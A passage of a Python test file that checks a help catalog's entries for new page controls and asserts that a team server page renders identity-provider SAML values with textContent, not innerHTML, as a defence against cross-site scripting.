    static = (ROOT / "static" / "help_catalog.js").read_bytes()
    assert static == (ROOT / "browser_extension" / "help_catalog.js").read_bytes()
    text = static.decode("utf-8")
    for page, ids in NEW_CONTROLS.items():
        block = text.split(f'"{page}": {{', 1)[1].split("\n  },", 1)[0]
        for sel in ids:
            assert f'"{sel}"' in block, f"{page} {sel} has no help entry"


def test_identity_provider_strings_reach_the_page_as_text_only():
    """ASVS V5.3.3 · CWE-79 · WSTG-CLNT-01: the Team server page writes the identity provider's values (entity ID, addresses, certificate subjects, problems) with textContent, never innerHTML."""
    page = (ROOT / "static" / "report_team.html").read_text(encoding="utf-8")
    fn = page.split("function renderSaml(", 1)[1].split("\n    }\n", 1)[0]
    assert "innerHTML" not in fn and "textContent" in fn
    for ids in NEW_CONTROLS.values():
        for sel in ids:
            assert re.search(rf'id="{sel[1:]}"', page + (ROOT / "static" / "login.html").read_text(encoding="utf-8")), sel
